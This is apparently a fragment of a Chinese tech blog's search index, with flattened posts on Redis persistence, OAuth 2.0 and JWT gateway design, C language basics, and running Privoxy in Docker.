AOF 文件出错（corrupt）， 那么 Redis 在重启时会拒绝载入这个 AOF 文件，从而确保数据的一致性不会被破坏。当发生这种情况时，可以用以下方法来修复出错的 AOF 文件： 为现有的 AOF 文件创建备份文件 使用 Redis 附带的 redis-check-aof 工具，对原来的 AOF 文件进行修复 1$ redis-check-aof --fix 使用 diff -u 命令对比修复后的 AOF 文件和原始的 AOF 备份文件，查看两个文件之间的不同之处，此步骤为可选操作 重启 Redis 服务器，等待服务器载入修复后的 AOF 文件，并进行数据恢复 RDB 和 AOF 对比 如何选择使用哪种持久化方式？ 如果非常关心数据的安全性，但仍然可以承受数分钟以内的数据丢失，那么可以只使用 RDB 持久化 不推荐只使用 AOF 持久化，因为定时生成 RDB 快照（snapshot）非常便于进行数据库备份，并且 RDB 恢复数据集的速度也要比 AOF 恢复的速度要快 如果想达到足以媲美 PostgreSQL 的数据安全性，则应该同时使用两种持久化机制。当同时使用 RDB 和 AOF 两种持久化机制时，那么在 Redis 重启的时候，会优先使用 AOF 来重建数据集，因为 AOF 的数据更加完整 总结，生产环境中推荐同时使用 AOF 和 RDB 两种持久化机制，用 AOF 来保证数据不丢失，作为恢复数据的第一选择；用 RDB 来做不同程度的冷备，在 AOF 文件都丢失或损坏不可用的时候，可以使用 RDB 进行快速的数据恢复。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"缓存"},{title:"Gateway + Security + OAuth 2.0 + JWT 实现统一的认证授权",url:"/posts/2cb9090c.html",text:'1、前言1.1、OAuth 2.0 介绍 OAuth 2.0 特性与介绍 1.2、OAuth 2.0 与 JWT 的关系 OAuth 2.0 是一种认证授权的协议规范 JWT 是基于 Token 的安全认证协议的实现 OAuth 2.0 的认证服务器签发的 Token 可以使用 JWT 来实现，JWT 轻量且安全。 1.3、基于 OAuth 2.0 认证授权的框架OAuth 的官网提供了很多开发框架，分为服务器端和客户端，其中服务端和客户端都支持的 Java 框架有四个：Apache Oltu、Spring Security OAuth、Restlet Framework、Keycloak。值得一提的是，Keycloak 为现代应用和分布式服务提供了一套完整的认证授权管理开源解决方案，是一个独立的认证授权服务器；主要是基于 OAuth 2.0 协议实现，同时提供了多种语言库，可以很快速地根据业务需求将 Keycloak 集成到企业项目中去使用。 2、Gateway + Security + OAuth 2.0 + Knife4j2.1、认证授权流程 用户携带账号密码通过网关服务请求认证服务 认证通过后，授权服务颁发身份令牌给客户端，并将身份令牌储存在 Redis/MySQL 中 用户携带身份令牌请求资源服务（微服务应用），必经网关服务 网关服务获取客户端带来的令牌和 Redis/MySQL 中的令牌进行比对校验 网关服务校验通过后，转发 HTTP 请求，资源服务（微服务应用）获取到身份令牌，进行身份校验和鉴权，通过后处理系统业务 资源服务（微服务应用）将响应数据返回给客户端 提示：Gateway 校验并解析外部传递过来的身份令牌后，可以获取到用户信息（身份 + 权限），并将用户信息写入到 HTTP Header 里，让后续的微服务可以方便地得到用户信息 2.2、应用架构设计12345├── common 基础模块├── eureka 注册中心模块├── gateway 网关模块，负责校验认证（Token）、请求转发、统一解析用户信息├── shop 业务模块，负责校验认证（Token） 、鉴权└── auth 认证模块，负责用户的Oauth2.0认证授权，基于MySQL存储 认证服务负责认证和授权，网关服务只负责校验认证（Token）、请求转发和统一解析用户信息，业务模块负责校验认证（Token）和鉴权。由于 gateway、shop 模块没有使用 MySQL 存储，暂时无法实现注销 Token 的功能；若两者都引入 MySQL 存储，感觉应用有点重（依赖 ORM 框架，而且可能出现多数据源的场景），或者需要使用 Redis 存储来替代 MySQL 存储。终上所述，如果不考虑提供注销 Token 的功能，该方案还是可以接受的。 2.3、下载案例代码 Gateway + Security + OAuth 2.0 + Knife4j 整合案例代码下载 3、Gateway + Security + OAuth 2.0 + JWT3.1、应用架构设计123├── micro-oauth2-api 受保护的API服务，用户被网关服务鉴权通过后可以访问该服务，不整合Spring Security + Oauth2.0├── micro-oauth2-auth Oauth2.0认证服务，负责对登录用户进行认证授权，整合Spring Security + Oauth2.0，基于Redis存储└── micro-oauth2-gateway 网关服务，负责校验认证（Token）、鉴权和请求转发等，整合Spring Security + Oauth2，基于Redis存储 认证服务负责认证和授权，网关负责校验认证（Token）和鉴权，其他 API 服务则只负责处理自己的业务逻辑。安全相关的逻辑只存在于认证服务和网关服务中，其他 API 服务只是单纯地提供服务而没有任何安全相关逻辑。这种应用架构要求所有 HTTP 请求都必须经过网关服务，同时任何 API 服务都不能暴露在外网，否则会存在极大的安全隐患。 3.2、下载案例代码 Gateway + Security + OAuth 2.0 + JWT 整合案例代码下载 4、延伸内容4.1、Knife4j 整合 OAuth 2.0 Knife4j 整合 OAuth 2.0 4.2、网关是否适合进行认证与鉴权 第一派系：网关不适合进行业务操作，所以做个简单的去 Redis 比较 Token 校验是正确思路，剩下的交给后续的服务做 优点：不用在网关服务引入多余的 Spring Security、ORM 框架 缺点：第二派系的优点 第二派系： 网关用来认证与鉴权，登录蹦不蹦已经不是问题了，毕竟网关宕机，代表系统瘫痪了 优点：权限方面的代码会很好写，控制 URL 即可 缺点：第一派系的优点 第三派系： 网关用来认证与鉴权，但鉴权所需的数据（用户、角色、权限）从 Caffeine + Redis 缓存中加载，而认证授权服务启动时，负责将 MySQL 中权限相关的数据提前加载到 Redis 优点：第一与第二派系的优点 缺点：严重依赖 Redis，一般需要部署维护 Redis 集群，如果 Redis 集群宕机，可能会造成网关鉴权功能不可用或者系统瘫痪 4.3、基于 HTTP Header 传递用户信息的缺点基于 Spring Cloud 的技术体系（RESTful 接口规范），Gateway 校验并解析外部传递过来的 Access Token 后，获取到用户信息（身份 + 权限），同时将用户信息写入到 HTTP Header 里，让后面的业务系统接收到 Gateway 转发过来的请求后，也能从 HTTP Header 里得到相应的用户信息。但这种方式对使用了 RPC 调用的场景不适用，因为在 RPC 调用里，无法从 HTTP Header 获取到任何数据，该问题的讨论可以关注这里。 5、参考博客 API 网关认证授权 OAuth 2.0 的 Java 各类配置与使用场景 FAQ Spring Cloud Gateway + Security + OAuth 2.0 搭建微服务统一认证授权 Spring Cloud Gateway + Security + OAuth 2.0 + JWT 实现微服务统一认证鉴权 Spring Cloud Gateway + Security + OAuth 2.0 + JWT 集成统一认证授权平台下实现注销使 JWT 失效方案 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务 oauth"},{title:"JWT 基础使用教程",url:"/posts/1b9bb05b.html",text:'JWT 概述JSON Web Token（JWT）是目前最流行的跨域身份验证解决方案。 传统的身份验证 用户向服务器发送用户名和密码 验证服务器后，相关数据（如用户角色，登录时间等）将保存在当前会话中 服务器向用户返回 session_id，Session 信息都会写入到用户的 Cookie 中 用户的每个后续请求都将通过在 Cookie 中取出 session_id 并传递给服务器 服务器收到 session_id 并对比之前保存的数据，确认用户的身份 这种模式最大的问题是，没有分布式架构，无法支持横向扩展。如果使用一个服务器，该模式完全没有问题。但是，如果它是服务器群集或面向服务的跨域体系结构的话，则需要一个统一的 Session 数据库（Redis）来保存会话数据实现共享，如果保存 Session 的数据库（Redis）挂掉，整个认证体系都会挂掉。 JWT 的身份验证JWT 的原则是在服务器身份验证之后，将生成一个 JSON 对象并将其发送给用户。之后，当用户与服务器通信时，客户在请求中带上 JSON 对象，服务器仅依赖于这个 JSON 对象来标识用户。为了防止用户篡改数据，服务器将在生成对象时添加签名。服务器不保存任何会话数据，即服务器变为无状态，使其更容易扩展。具体的身份验证流程如下： 用户发起登录请求，请求认证服务 认证服务成功认证后，生成 JWT 令牌，并将 JWT 令牌写入到用户的 Cookie 用户访问 Web 资源页面，带着 Cookie 到网关服务 网关服务从 Cookie 获取并校验用户的 JWT 令牌，如果 JWT 令牌有效否则放行请求 用户注销登录，请求认证服务，删除用户 Cookie 中的 JWT 令牌 JWT 与 传统身份验证比较JWT 和传统的 Cookie/Session 会话管理相比较有着多方面的优势，因为 Cookie/Session 需要在 Web 服务器的 Session 里存放用户信息，然后通过客户端 Cookie 中存储的 session_id 来获取特定的用户信息，这个过程需要消耗 Web 服务器的内存和对客户端的要求比较严格（必须支持 Cookie），而 JWT 最大的特性在于就是无状态、去中心化，所以 JWT 更适用分布式的场景，不需要在多台服务器做会话同步这种消耗服务器性能的操作。另外 JWT 和 Redis + Token 这两种会话管理方案需要根据项目情况选择，别用了 JWT 还使用 Redis 存储的，因为这种做法对 JWT 来说就是 “伤害不大，但侮辱性极强” 的做法，相当于无视 JWT 的 “无状态” 特性。 JWT 字符串结构JWT 字符串由 Header（头部）、Payload（负载）、Signature（签名）三部分组成： Header: JSON 对象，用来描述 JWT 的元数据，alg 属性表示签名的算法，typ 标识 token 的类型 Payload: JSON 对象，重要部分，除了默认的字段，还可以扩展自定义字段，比如用户 ID、姓名、角色等等 Signature: 对 Header、Payload 这两部分进行签名，认证服务器使用私钥签名，然后在资源服务器使用公钥验签，防止数据被人动了手脚 JWT 签名有对称和非对称两种方式： 对称方式：认证服务器和资源服务器使用同一个密钥进行加签和验签 ，默认算法 HMAC 非对称方式：认证服务器使用私钥加签，资源服务器使用公钥验签，默认算法 RSA 非对称方式相较于对称方式更为安全，因为私钥只有认证服务器知道 JWT 开源库的使用OAuth 2.0 与 JWT 的关系 OAuth 2.0 是一种认证授权的协议规范 JWT 是基于 Token 的安全认证协议的实现 OAuth 2.0 的认证服务器签发的 Token 可以使用 JWT 来实现，JWT 轻量且安全。 Gateway + OAuth 2.0 + JWT 实现统一的认证授权 Gateway + Security + OAuth 2.0 + JWT 实现统一的认证授权 参考博客 nimbus-jose-jwt JWT 库使用介绍 Spring Cloud Gateway + JWT 实现统一的认证授权 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"oauth"},{title:"C 语言语法之四数组",url:"/posts/7f62c448.html",text:'数组的概念 在程序设计中，为了处理方便把具有相同类型的若干变量按有序的形式组织起来，这些按序排列的同类数据元素的集合称为数组 数组是具有相同类型的数据组成的有序集合，其中的每一个数据称包含数组元素与数组下标，数组元素是由其所在的位置序号（称数组元素的下标）来区分 在 C 语言中数组属于构造数据类型，一个数组可以分解为多个数组元素，这些数组元素可以是基本数据类型或是构造类型。因此按数组元素的类型不同，数组又可分为数值数组、字符数组、指针数组、结构数组等各种类别 一维数组的定义 一维数组的定义方式为：类型说明符 数组名 [常量表达式]；例如：int a[10]; 表示定义了一个整型数组，数组名为 a，此数组有 10 个元素，10 个元素都是整型变量 数组元素的一般引用形式为：数组名 [下标]，例如：int x = a[0] 一维数组在内存中的存放时，每个数据元素占用的字节数，就是基本数据类型的字节数，具体存放方式如下： 数组使用注意事项 方括号中的常量表达式表示数据元素的个数，也称为数组的长度 数组名是用户定义的数组标识符，书写规则应符合标识符的书写规定 允许在同一个类型说明中，定义多个数组和多个变量，例如：int a,b,c,d,k1[10],k2[20]; 类型说明符是任一种基本数据类型或构造数据类型，对于同一个数组，其所有元素的数据类型都是相同的 数组 a[10]，表示 a 数组有 10 个元素，下标是从 0 开始的，这 10 个元素是 a [0]，a [1] … a [8]，a [9]，按上面的定义，不存在数组元素 a[10] C 语言不允许对数组的大小作动态定义，即数组的大小不依赖于程序运行过程中变量的值，以下代码是错误的： 1234567/********C语言不允许对数组的大小作动态定义，下面的写法是错误的********/int main(){ int n; scanf("%d", &amp;n); int a[n]; return 0;} 数组元素通常也称为下标变量，必须先定义数组，才能使用下标变量；在 C 语言中只能逐个地使用下标变量，而不能一次引用整个数组，例如： 12345678910/********输出有10个元素的数组时，必须使用循环语句逐个输出各下标变量********/int main(){ for(i=0; i&lt;10; i++) { printf("%d", a[i]); } return 0;}// 不能用一个语句输出整个数组，此写法是错误的：printf("%d", a); 定义数组时用到的数组名 [常量表达式] 和引用数组元素时用到的数组名[下标] 是有区别的，例如：int a[10]; 中的 10 是指数组长度，t=a[6]; 是指引用 a 数组中序号为 6 的元素，此时 6 不代表数组长度 一维数组的初始化赋值 数组初始化赋值是指在数组定义时给数组元素赋予初值，数组初始化的过程是在编译阶段进行的，这样可以减少运行间，提高运行效率 数组赋值的方法除了用赋值语句对数组元素逐个赋值外，还可采用初始化赋值和动态赋值的方法 数组初始化赋值的一般形式为：类型说明符 数组名[常量表达式]={值, 值, ……值};，例如：int a［10］= {0, 1, 2, 3, 4, 5, 6, 7, 8, 9}; 可以只给一部分数组元素赋值，例如:int a［10］= {0, 1, 2, 3, 4};，表示定义 a 数组有 10 个元素，但花括弧内只提供 5 个初值，这代表只给前面 5 个元素赋初值，后 5 个元素值默认缺省为 0 在对全部数组元素赋初值时，由于数据的个数已经确定，因此可以不指定数组长度，例如：int a［5］= {1, 2, 3, 4, 5}; 可以写成：int a［ ］= {1, 2, 3, 4, 5}; 数组动态赋值的代码示例如下： 12345678910111213141516/********输入五个数，求出最大的数********/int main(){ int i, max=0, a[5]; printf("please input five number:\\n"); setbuf(stdin, NULL); for(i=0; i&lt;=4; i++){ scanf("%d", &amp;a[i]); } for(i=0; i&lt;=4; i++){ if(a[i] &gt; max){ max = a[i]; } } printf("max=%d\\n", max); return 0;} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"c语言"},{title:"C 语言语法之三循环控制结构",url:"/posts/e2f81b63.html",text:'循环控制结构循环结构循环结构是程序中一种很重要的结构。其特点是，在给定条件成立时，反复执行某程序段，直到条件不成立为止。给定的条件称为循环条件，反复执行的程序段称为循环体。C 语言提供了多种循环语句，可以组成各种不同形式的循环结构，分别是： 用 for 语句 用 while 语句 用 do-while 语句 用 goto 语句和 if 语句构成循环 goto 语句 goto 语句是一种无条件转移语句，与 BASIC 中的 goto 语句相似，goto 语句的使用格式为：goto 语句标号; 其中标号是一个有效的标识符，这个标识符加上一个 : 一起出现在函数内某处，执行 goto 语句后，程序将跳转到该标号处并执行其后的语句。另外标号必须与 goto 语句同处于一个函数中，但可以不在一个循环层中。通常 goto 语句与 if 条件语句连用，当满足某一条件时，程序跳到标号处运行 必须注意，goto 语句通常不建议使用，因为它将使程序层次不清，且不易读，但在多层嵌套退出时，用 goto 语句则比较合理 123456789101112/*******使用goto语句和if语句构成循环*******/int main(){ int i=1,sum=0; loop: if (i&lt;=100) { sum=sum+i; i++; goto loop; } printf("%d\\n",sum);} while 语句 while 语句的一般形式为：while (表达式) 语句，其中表达式是循环条件，语句为循环体。while 语句的语义是：计算表达式的值，当值为真（非 0）时，则执行循环体语句，其执行过程可用下图表示： while 语句中的表达式一般是关系表达或逻辑表达式，只要表达式的值为真 (非 0)，即可继续循环 循环体如包括有一个以上的语句，则必须用 {} 括起来，组成复合语句 注意：如果 while 循环的表达式的值一开始就为 0，则循环语句一次也会被不执行 1234567891011121314151617181920212223242526/*******使用while语句构成循环*******/int main(){ int i=1,sum=0; while(i&lt;=100) { sum=sum+i; i++; } printf("%d\\n",sum);}/*******下面的while循环永远不会退出（死循环）*******/int main(){ int i=1,sum=0; while(i&lt;=100) // ｝ sum=sum+i; i++; // } printf("%d\\n",sum);}// 因为上面的while循环体没有使用{}括起来，i++不属于while循环体内的一部分，导致了死循环的发生 do-while 语句 do-while 语句的一般形式为：do 语句 while(表达式);，这个循环与 while 循环的不同在于，它先执行循环中的语句，然后再判断表达式是否为真，如果为真则继续循环；如果为假，则终止循环。因此，do-while 循环至少要执行一次循环语句 1234567891011/*******使用do-while语句构成循环*******/int main(){ int i=1,sum=0; do { sum=sum+i; i++; } while(i&lt;=100); printf("%d\\n", sum);} for 语句 在 C 语言中，for 语句使用最为灵活，它完全可以取代 while 语句，它的一般形式为：for (表达式 1；表达式 2；表达式 3) 语句 for 语句的执行过程如下： 123451. 先求解表达式12. 求解表达式2，若其值为真（非0），则执行for语句中指定的内嵌语句，然后执行下面第3步；若其值为假（0），则结束循环，转到第5步3. 求解表达式34. 转回上面第2步继续执行5. 循环结束，执行for语句下面的一个语句 for 语句最简单的应用形式也是最容易理解的形式是：for (循环变量赋初值；循环条件；循环变量增量) 语句；其中循环变量赋初值总是一个赋值语句，它用来给循环控制变量赋初值；循环条件是一个关系表达式，它决定什么时候退出循环；循环变量增量，定义循环控制变量每循环一次后按什么方式变化。这三个部分之间用 ; 分开，具体示例如下： 1234for(i=1; i&lt;=100; i++){ sum=sum+i;} for 语句的使用注意事项 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253i. for循环中的“表达式1（循环变量赋初值）”、“表达式2(循环条件)”和“表达式3(循环变量增量)”都是可选择项，即可以缺省，但“；”不能缺省ii. 若三个表达式都省略了，此时 for(;;) 语句相当于 while(1) 语句iii. 省略了“表达式1（循环变量赋初值）”，表示不对循环控制变量赋初值iiii. 可省略“表达式1（循环变量赋初值）”和“表达式3(循环变量增量)”，例如：for(;i&lt;=100;){ sum=sum+i; i++;}iiiii. 省略了“表达式2(循环条件)”，则不做其它处理时便成为死循环，例如：for(i=1;;i++){ sum=sum+i;}iiiiii. 省略了“表达式3(循环变量增量)”，则不对循环控制变量进行操作，这时可在循环体中加入修改循环控制变量的语句，例如：for(i=1;i&lt;=100;){ sum=sum+i; i++;}iiiiiii. 表达式1可以是设置循环变量的初值的赋值表达式，也可以是其他表达式，例如：for(sum=0;i&lt;=100;i++){ sum=sum+i;}iiiiiiii. 表达式1和表达式3可以是一个简单表达式也可以是逗号表达式，例如:for(sum=0,i=1;i&lt;=100;i++){{ sum=sum+i;}或者：for(i=0,j=100;i&lt;=100;i++,j--){ k=i+j;}iiiiiiiii. 表达式2一般是关系表达式或逻辑表达式，但也可是数值表达式或字符表达式，只要其值非零，就会执行循环体，例如：for(i=0;(c=getchar())!=\'\\n\';i+=c){ printf("%c",c);}或者：for(;(c=getchar())!=\'\\n\';){ printf("%c",c);} 四种循环语句的比较 四种循环都可以用来处理同一问题，一般情况下它们可以互相代替，但一般不提倡用 goto 型循环 在 while 循环和 do-while 循环中，都是在 while 后面的括号内指定循环条件，因此为了使循环能正常结束，应在循环体中包含使循环趋于结束的语句 (如 i++，或 i=i+1 等) for 循环可以在表达式 3 中包含使循环趋于结束的操作，甚至可以将循环体中的操作全部放到表达式 3 中，因此 for 语句的功能更强；凡是用 while 循环能完成的功能，for 循环都能实现 用 while 和 do-while 循环时，循环变量初始化的操作应在 while 和 do-while 语句之前完成，而 for 语句可以在表达式 1 中实现循环变量的初始化 while 循环、do-while 循环和 for 循环，都可以用 break 语句跳出循环，用 continue 语句结束本次循环；而对用 goto 语句和 if 语句构成的循环，不能用 break 语句和 continue 语句进行控制 break 语句 break 语句可以用来从循环体内跳出循环体，即提前结束循环，然后接着执行循环下面的语句，一般形式：break; break 语句不能用于循环语句和 switch 语句之外的任何其他语句中 break 语句对 if-else 的条件语句不起作用 在多层循环中，一个 break 语句只向外跳一层 continue 语句 continue 语句的作用是结束本次循环，即跳过循环体中下面尚未执行的语句，接着进行下一次是否执行循环的判定。一般形式：continue; continue 语句和 break 语句的区别是，continue 语句只结束本次循环，而不是终止整个循环的执行；break 语句则是结束整个循环过程，不再判断执行循环的条件是否成立 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"c语言"},{title:"Docker 安装 Privoxy 代理服务",url:"/posts/1b7c9c6f.html",text:'安装环境 环境名称 版本 linux CentOS Linux release 7.7.1908 (Core) docker-ce 19.03.8 docker-compose 1.24.0-rc1 docker image vimagick/privoxy:latest 初始目录结构 12345~/fig/privoxy/├── docker-compose.yml└── privoxy/ ├── user.action └── user.filter 文件：docker-compose.yml 123456789101112131415version: "3.5"services: privoxy: image: vimagick/privoxy:latest container_name: privoxy ports: - 8118:8118 volumes: - ./privoxy/user.action:/etc/privoxy/user.action - ./privoxy/user.filter:/etc/privoxy/user.filter cap_add: - NET_ADMIN restart: always 文件：user.action 注意：以下的配置内容，作用是阻止 Privoxy 指向服务器本身的 IP 和域名，需要替换为你自己服务器的 IP 和域名。 1234{+block{block ip and domain which point to server itself}}127.0.0.145.32.57.113.example.com 文件：user.filter 该文件用于存放 Privoxy 的过滤规则，暂时不需要填写任何内容。 启动 Privoxy 服务 12345678910111213141516171819# 进入目标目录# cd ~/fig/privoxy/# 创建并启动容器# docker-compose up -d# 打印日志信息$ docker-compose logs# 若输出的日志信息如下，则说明Privoxy的代理服务启动成功Attaching to privoxyprivoxy | 2020-03-27 22:49:28.383 7f30fa6aed48 Info: Privoxy version 3.0.28privoxy | 2020-03-27 22:49:28.383 7f30fa6aed48 Info: Program name: privoxyprivoxy | 2020-03-27 22:49:28.384 7f30fa6aed48 Info: Loading filter file: /etc/privoxy/default.filterprivoxy | 2020-03-27 22:49:28.386 7f30fa6aed48 Info: Loading filter file: /etc/privoxy/user.filterprivoxy | 2020-03-27 22:49:28.386 7f30fa6aed48 Info: Loading actions file: /etc/privoxy/match-all.actionprivoxy | 2020-03-27 22:49:28.386 7f30fa6aed48 Info: Loading actions file: /etc/privoxy/default.actionprivoxy | 2020-03-27 22:49:28.389 7f30fa6aed48 Info: Loading actions file: /etc/privoxy/user.actionprivoxy | 2020-03-27 22:49:28.389 7f30fa6aed48 Info: Listening on port 8118 on IP address 0.0.0.0 创建 Privoxy 的主配置文件 123456789101112131415161718192021222324# 进入目标目录# cd ~/fig/privoxy# 拷贝容器中的config文件到本地目录（前提是容器已正常启动）# docker cp privoxy:/etc/privoxy/config ./privoxy/config# 文件授权# chmod 644 ./privoxy/config# 编辑docker-compose的配置文件，添加以下内容来挂载本地的config文件# vim docker-compose.ymlvolumes: - ./privoxy/config:/etc/privoxy/config# 重启容器让配置变更生效# docker-compose restart# 最终的目录结构~/fig/privoxy/├── docker-compose.yml└── privoxy/ ├── config ├── user.action └── user.filter 限制访问 Privoxy 代理服务的 IP（可选步骤） 123456789# 进入目标目录# cd ~/fig/privoxy# 编辑config文件，在文件末尾添加一行内容（IP需要根据自己的实际情况进行修改）# vim ./privoxy/configpermit-access 14.215.177.38/26# 重启容器让配置变更生效# docker-compose restart 开放防火墙端口（Centos7） 12345678# 开放Privoxy监听的8118端口# firewall-cmd --zone=public --permanent --add-port=8118/tcp# 保存防火墙配置# firewall-cmd --reload# 查看防火墙已开放的端口# firewall-cmd --list-ports 验证代理服务是否可用 12345678910111213141516# 登录其他Linux系统# 执行以下命令，若返回200状态码，则说明代理服务可用# curl -I -x 45.32.57.113:8118 www.baidu.comHTTP/1.1 200 OKAccept-Ranges: bytesCache-Control: private, no-cache, no-store, proxy-revalidate, no-transformConnection: keep-aliveContent-Length: 277Content-Type: text/htmlDate: Fri, 27 Mar 2020 01:40:09 GMTEtag: "575e1f60-115"Last-Modified: Mon, 13 Jun 2016 02:50:08 GMTPragma: no-cacheServer: bfe/1.0.8.18Proxy-Connection: keep-alive 参考资料 vimagick/privoxy var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"容器化"},{title:"C 语言语法之二顺序程序与分支结构程序设计",url:"/posts/b27b9a6a.html",text:'赋值语句 注意在变量声明中给变量赋初值和赋值语句的区别，给变量赋初值是变量声明的一部分，赋初值后的变量与其后的其它同类变量之间仍必须用逗号间隔，而赋值语句则必须用分号结尾，例如：int a=5,b,c; 在变量声明中，不允许连续给多个变量赋初值，而赋值语句则允许连续赋值，如 int a=b=c=5; 声明是错误的，正确的写法必须是：int a=5,b=5,c=5; 注意赋值表达式和赋值语句的区别，赋值表达式是一种表达式，它可以出现在任何允许表达式出现的地方，而赋值语句则不能，如 if((x=y+5)&gt;0) z=x; 语句是合法的，if((x=y+5;)&gt;0) z=x; 语句是非法的，因为 x=y+5; 是语句，不能出现在表达式中 putchar 函数与 getchar 函数 使用 putchar 和 getchar 函数前，都必须要用文件包含命令 #include &lt;stdio.h&gt; 或 #include “stdio.h” putchar 函数是字符输出函数，功能是在显示器上输出单个字符，其一般形式为：putchar (字符变量)，如 putchar(\'A\'); getchar 函数的功能是从键盘上输入一个字符，其一般形式为：getchar ()，通常把输入的字符赋予一个字符变量来构成赋值语句，如：char c = getchar(); putch 函数与 getch 函数 getch 函数是一个不回显函数，当用户按下某个字符时，函数自动读取，无需按回车；有的 C 语言命令行程序会用到此函数做游戏，但是这个函数并非标准函数，要注意不同平台的移植性 Windows 系统使用 putch 和 getch 函数，需要引入 ‘conio.h’ 头文件；在使用 getch 函数之前要调用 initscr()，结束时要调用 endwin()，否则会出现不输入字符这个函数也会有返回值的情况 在不同的系统平台，输入回车，getch 函数将返回不同数值，而 getchar 函数统一返回十进制数 10 (即 \\n) Linux 系统不存在 conio.h 头文件，但可以使用 curses 库替代；若在编译的时候不通过，gcc 编译命令需要添加 -l curses 参数来引入 curses 库。Linux 系统下只能使用 getch 函数，而 putch 函数不能使用，因为 curses 库里没有 putch 函数 printf 函数（格式输出函数） printf 函数称为格式输出函数，其关键字最末一个字母 f 即为 “格式”(format) 之意。其功能是按用户指定的格式，把指定的数据显示到显示器屏幕上。该函数是一个标准库函数，它的函数原型在头文件 stdio.h 中，但作为一个特例，不要求在使用 printf 函数之前必须包含 stdio.h 文件，其调用的一般形式为：printf (“格式控制字符串”，输出表列) 其中格式控制字符串用于指定输出格式，格式控制串可由格式字符串和非格式字符串两种组成。格式字符串是以 % 开头的字符串，在 % 后面跟有各种格式字符，以说明输出数据的类型、形式、长度、小数位数等，如：%c 表示按字符型输出，%d 表示按十进制整型输出，%f 表示按小数形式输出单精度实数 1234i. 类型：具体类型如下表所示ii. 长度：长度格式符为h、l两种，h表示按短整型量输出，l表示按长整型量输出iii. 输出最小宽度：用十进制整数来表示输出的最少位数，若实际位数多于定义的宽度，则按实际位数输出，若实际位数少于定义的宽度则补以空格或0iiii. 输出精度：精度格式符以`.`开头，后面跟十进制整数，本项的意义是如果输出数字，则表示小数的位数；如果输出的是字符，则表示输出字符的个数；若实际位数大于所定义的精度数，则截去超过的部分 1234567891011/printf函数使用例子/int a = 15;char d = \'p\';int x = 88, y = 89;float b = 123.1234567;double c = 12345678.1234567;printf("%c,%c\\n",x,y); // &gt;&gt; X, Yprintf("a=%d,%5d,%o,%x\\n",a,a,a,a); // &gt;&gt; a=15, 15,17,fprintf("b=%f,%lf,%5.4lf,%e\\n",b,b,b,b); // &gt;&gt; b=123.123459,123.123459,123.1235,1.231235e+02printf("c=%lf,%f,%8.4lf\\n",c,c,c); // &gt;&gt; c=12345678.123457,12345678.123457,12345678.1235printf("d=%c,%8c\\n",d,d); // &gt;&gt; d=p, p scanf 函数（格式输入函数） scanf 函数称为格式输入函数，即按用户指定的格式从键盘上把数据输入到指定的变量之中。该函数是一个标准库函数，它的函数原型在头文件 stdio.h 中，与 printf 函数相同，C 语言也允许在使用 scanf 函数之前不必包含 stdio.h 文件。scanf 函数的一般形式为：scanf (“格式控制字符串”，地址表列)，其中格式控制字符串的作用与 printf 函数相同，如：int a,b; scanf("%d%d",&amp;a,&amp;b);，但不能显示非格式字符串，也就是不能显示提示字符串。地址表列中给出各变量的地址，地址是由地址运算符 &amp; 后跟变量名组成，例如：&amp;a、 &amp;b 分别表示变量 a 和变量 b 的地址 